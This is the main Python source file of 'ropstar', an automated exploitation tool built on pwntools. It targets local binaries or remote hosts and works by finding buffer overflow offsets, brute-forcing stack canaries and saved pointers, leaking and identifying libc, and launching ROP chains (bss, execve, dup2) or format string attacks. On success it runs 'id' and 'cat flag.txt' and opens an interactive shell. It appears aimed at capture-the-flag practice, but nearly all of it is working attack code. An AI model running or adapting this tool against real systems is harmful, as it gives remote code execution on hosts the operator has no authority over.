#!/usr/bin/python
from pwn import *
import requests
import sys
import os
import re
import argparse
import inspect
from leak import Leak
from exploit import Exploit
from utils import *
from colorama import Fore, Back, Style
import requests.packages.urllib3
from importlib import import_module
requests.packages.urllib3.disable_warnings()

# Author: xct

class Ropstar():
	def __init__(self, argv):
		parser = argparse.ArgumentParser(description='Pwn things, fast.')
		parser.add_argument('bin',help='target binary (local)')
		parser.add_argument('-rhost',help='target host')
		parser.add_argument('-rport', help='target port (required if -rhost is set)')		
		parser.add_argument('-o', help='specify offset manually, skips dynamic resolution')
		parser.add_argument('-p', help='use proxy, e.g. https://127.0.0.1:8080')
		parser.add_argument('-m', help='specify address of main method, in case there is no symbols')
		parser.add_argument('-xor', help='xor payload with given byte')		
		parser.add_argument('-win', help='specify win function address to call')	
		parser.add_argument('-magic', help='magic string that needs to be sent before the payload')
		parser.add_argument('-remote_offset', help='get offset remotely via observing responses (often required with canaries)', action='store_true')
		parser.add_argument('-state', help='canary,rbp,rip (comma seperated)')
		parser.add_argument('-plugins', help='run custom plugins')																											

		self.args = parser.parse_args()
		self.home = os.getlogin()
		if self.home == 'root':
			self.home = '/'+self.home
		else:
			self.home = '/home/'+self.home					
		# set context
		context.endian = "little"
		context.os = "linux"
		context.log_level = "debug"		
		context.timeout = 10
		self.t = Timeout()
		self.bname = self.args.bin
		self.binary = ELF(self.bname)
		self.arch = self.binary.get_machine_arch()
		log.info("Arch: "+self.arch)
		if self.arch  == 'i386':
			context.bits = 32
			context.arch = self.arch 
			context.kernel = self.arch 
			self.pattern_reg = "eip"
		else:
			context.bits = 64
			context.arch = self.arch 
			context.kernel = self.arch 
			self.pattern_reg = "rsp"	
		if self.args.remote_offset:
			if not self.args.rhost or not self.args.rport:
				log.failure("You need to specify rhost & rport to use remote_offset")
				sys.exit(0)	
		self.offset = -1
		if self.args.xor:
			self.xor = self.args.xor.decode('hex')
		self.leak = Leak(self)	
		self.exploit = Exploit(self)
		# identity + rot13 for now
		self.encodings = [lambda x: x, lambda x: rot13(x)]
		self.success_marker = ''
		# some config options		
		self.pattern_length = 2000
		self.magic_newline = False
		if self.args.magic and "\\n" in self.args.magic:
			self.args.magic = self.args.magic.replace("\\n","")
			self.magic_newline = True
		self.canary = None


	def fit(self, payload):
		''' Fits the payload to the offset and potentical canary
		'''
		if self.binary.canary:
			result = b''
			log.info(f"Canary: {hex(self.canary)}")
			result += p64(self.canary)
			log.info(f"Bp: {hex(self.base_ptr)}")
			result += p64(self.base_ptr)
			result += payload
			result = fit({self.offset:result})
		else:
			result = fit({self.offset:payload})
		return result


	def run_plugins(self, proc):
		path = os.path.dirname(os.path.abspath(inspect.stack()[0][1]))+"/plugins/"
		files = [f for f in os.listdir(path) if f.endswith(".py") and not f == "__init__.py"]
		if len(files) > 0:
			log.info("Executing plugins: "+','.join(files))
			for file in files:
				p, _ = file.rsplit('.', 1)
				mod = import_module('plugins.'+p)
				_class  = getattr(mod, 'Plugin')
				plugin = _class(self.home)
				plugin.run(proc, proxy=self.args.p)


	def connect(self):
		''' Connects to remote or local binary
		'''
		p = None
		if self.args.rhost and self.args.rport:
			log.info("Using remote target "+self.args.rhost+":"+self.args.rport)	
			p = remote(self.args.rhost, self.args.rport)
		else:
			log.info("Using local target")	
			# env={'LD_PRELOAD': os.path.join(os.getcwd(), 'libc.so.6')}
			p = process(self.bname)
		return p


	def trigger(self, p, payload='', newline=True, recvall=False, prercv=False):
		''' function that puts payload into vulnerable buffer
		'''
		result = ''
		
		# clear buffer, this is slow, but sometimes required
		if prercv:
			p.recvlines(numlines=100, timeout=3)

		if self.args.magic:
			if not self.magic_newline:
				payload = self.args.magic + payload
			else:
				p.sendline(self.args.magic)
		if self.args.xor:
			payload = xor(payload, self.xor)
		if newline:
			p.sendline(payload)
		else:
			p.send(payload)
		try:
			if recvall:
				result = p.recvall(timeout=3)
			else:
				result = p.recvlines(numlines=100, timeout=3)
		except EOFError:
			pass
		return result


	def trigger_fmt(self, payload):	
		''' alternative to trigger for fmt string exploits (connects on its own)
		'''	
		p = self.connect()
		result = ''
		if self.args.magic:
			p.send(self.args.magic) # or sendline?
		p.sendline(payload)
		try:
			result = p.recvall()			
			pattern = "(START0[xX][0-9a-fA-F]{4,8}END)"
			m = re.search(pattern, result)			
			if m:
				result = m.groups(1)[0]
				log.info('FmtStr leak: '+result.strip("START").strip("END"))		
		except EOFError:
			pass
		p.close()
		return result


	def get_dynamic(self):
		if not self.args.remote_offset:
			return self.get_offset_local()
		else:
			return self.get_offset_remote()


	def get_offset_remote(self):
		''' Trial and error offset retrieval
		'''	
		for i in range(1, self.pattern_length):
			p = self.connect()
			try:
				result = self.trigger(p, cyclic(i), recvall=True)
				result = result.decode()
				if self.success_marker not in result:
					self.offset = i#-1
					log.success("Offset: "+str(self.offset))
					return True 	
			except EOFError:
				self.offset = i
				log.success("Offset: "+str(self.offset))
				return True
			p.close()		
		return False


	def get_offset_local(self):
		''' get offset with unique pattern
		'''
		for enc in self.encodings:
			p = process(self.bname)
			pattern = cyclic(self.pattern_length)
			pattern = enc(pattern)
			if self.args.magic:
				p.sendline(self.args.magic)			
			try:			
				p.sendline(pattern)
			except EOFError:
				log.failure("Can not get offset")
				return False
			p.wait()
			p.close()
			core = Coredump('./core')
			log.info("Fault: "+hex(core.fault_addr))
			addr = core.fault_addr & 0x000000ffffffff # have to make it 32 bit or cyclic crashes
			self.offset = cyclic_find(addr)
			# offset can not be higher than the pattern length
			if self.offset > self.pattern_length:
				continue
			if self.offset != -1:
				log.success("Offset: "+str(self.offset))
				return True
		log.failure("Can not get offset")
		return False


	def get_success_marker(self):
		'''
		'''
		p = self.connect()
		# get positive verifier, so we know what to expect if it doesn't crash
		result = self.trigger(p, 'test', newline=False, recvall=True)
		self.success_marker = result[-6:].decode()
		log.info("Success marker: "+self.success_marker)
		p.close()


	def check_success(self, p):
		''' Check if we can execute shell commands
		'''
		try:
			p.sendline("id")
			out = p.recvline()
			log.success(out)
			if len(out) > 0:
				p.sendline("cat flag.txt")
				flag = p.recvline()
				if self.args.plugins:
					self.run_plugins(p,)
				log.info('Time spent: '+str(round((time.time() - self.start_time),2))+'s')	
				p.interactive()
				return True
		except EOFError:
			log.failure("Failed")
			pass
		return False


	def debug(self, bp):
		gdb.attach(p, '''
		set follow-fork-mode child
		set breakpoint %s
		continue
		'''.format(bp))


	def smart_leak(self, p=None):
		# run seperate p
		if not self.binary.canary and not p:
			p = self.connect()		
			leak = self.leak.leak_libc(p)
			p.close()
		# keep p open
		elif not self.binary.canary and p:
			leak = self.leak.leak_libc(p)
		# run multiple p's
		else:
			leak = self.leak.leak_libc(p=None, is_forking=True)
		return leak


	def main(self):
		self.start_time = time.time()

		# offset can also be given on command line		
		if not self.args.o and not self.binary.canary:
			# resolve offset dynamically
			log.info("Getting offset")
			result = self.get_dynamic()
			if not result:
				log.info("Trying format string vector")
				# no offset found via simple overflow, maybe fmt string?
				offset = -1
				try:
					autofmt = FmtStr(self.trigger_fmt)
					if autofmt.offset == -1:
						log.failure("Could not find format string vector")
						return
					p = self.connect()					
					self.exploit.fmt(p, autofmt)
					p.close()							
					return
				except (IndexError, EOFError):
					log.failure("Probably not vulnerable to format string vector")
					return

		if self.args.o:
			self.offset = int(self.args.o)
			log.info("Offset: "+str(self.offset))

		if self.binary.canary:
			# we need a marker for successful, non crashing requests to bruteforce values
			self.get_success_marker()
			log.info("Binary uses stack canary")
			# get offset
			self.get_dynamic()

			if self.offset == -1:
				log.failure("Can't continue without offset, consider providing it with -o <offset>")
				exit(-1) 
			# did the user provide the values from a previous run ?
			if self.args.state:
				canary, base_ptr, instr_ptr = self.args.state.split(',')
				self.canary = int(canary,16)
				self.base_ptr = int(base_ptr,16)
				self.instr_ptr = int(instr_ptr,16)
				log.info("canary: "+hex(self.canary))
				log.info("base ptr: "+hex(self.base_ptr))
				log.info("instr ptr: "+hex(self.instr_ptr))
			else:
				# bruteforce values
				log.info("Bruting canary, base ptr, intr ptr")	
				log.info("This can take a while, go grab a coffee")
				pause()
				payload = cyclic(self.offset)
				canary = self.leak.leak_qword(payload) # canary
				payload = decode(payload) + canary
				base_ptr = self.leak.leak_qword(payload) # rbp
				payload = decode(payload) +  base_ptr
				instr_ptr = self.leak.leak_qword(payload) # rip					
				log.info("canary: "+hex(u64(canary)))
				log.info("base ptr: "+hex(u64(base_ptr)))
				log.info("instr ptr: "+hex(u64(instr_ptr)))				
				self.canary = u64(canary)
				self.base_ptr = u64(base_ptr)
				self.instr_ptr = u64(instr_ptr)		
			addr = self.instr_ptr - (self.instr_ptr & 0xfff)	
			entry_offset = (self.binary.entry & 0xfffffffffffff000)
			self.binary.address =  addr - entry_offset			
			log.info("Base: "+hex(self.binary.address))
			log.info("You probably want to save these values")
			pause()	

		if self.args.win:
			p = self.connect()	
			if self.exploit.win(p, self.args.win):
				p.close()
			return
		
		# leakless works for static & non-static binaries
		log.info("Checking for leakless exploitation")
		p = self.connect()	
		if self.exploit.bss(p):
			p.close()
			return
		# static compiled binaries get their gadgets from their elf
		if not self.binary.libc:
			if self.exploit.static(p):
				p.close()
				return
		p.close()

		# dynamic complied binary, try leaking libc & exploiting via libc
		log.info("Getting Leak")
		leak = self.smart_leak()

		if len(leak) > 0:
			log.info("Getting libc version")
			versions = self.leak.ident_libc(leak)
			exploits = [self.exploit.bss, self.exploit.bss_execve, self.exploit.dup2, self.exploit.default]
			for version in versions:
				for exploit in exploits:

					p = self.connect()
					leak = self.smart_leak(p)

					if len(leak) == 0:
						continue
					log.info("Using "+version)
					try:
						libc = ELF(version) # take first hit for now
					except IOError:
						log.failure("Could not load "+version+ "(skipping)")
						continue
					name, addr = list(leak.items())[0]
					libc.address = addr - libc.symbols[name]
					log.success("Libc base: {0}".format(hex(libc.address)))
					# exploit
					log.info("Running exploits")
					try:
						if exploit(p, libc):
							log.success("Done!")
							return				
					except EOFError:
						pass
				log.failure("Could not exploit target.")
				p.close()
		else:
			log.failure("Could not leak anything")


if __name__ == '__main__':
	logo = r"""
                          __            
   _________  ____  _____/ /_____ ______
  / ___/ __ \/ __ \/ ___/ __/ __ `/ ___/  
 / /  / /_/ / /_/ (__  ) /_/ /_/ / /    
/_/   \____/ .___/____/\__/\__,_/_/     
          /_/                           
                  xct@vulndev.io | v0.2   								
	"""
	print(Fore.RED+logo+Style.RESET_ALL)

	if sys.version_info < (3, 0):
		print("Requires python 3.x")
		exit(0)

	app = Ropstar(sys.argv)
	app.main()
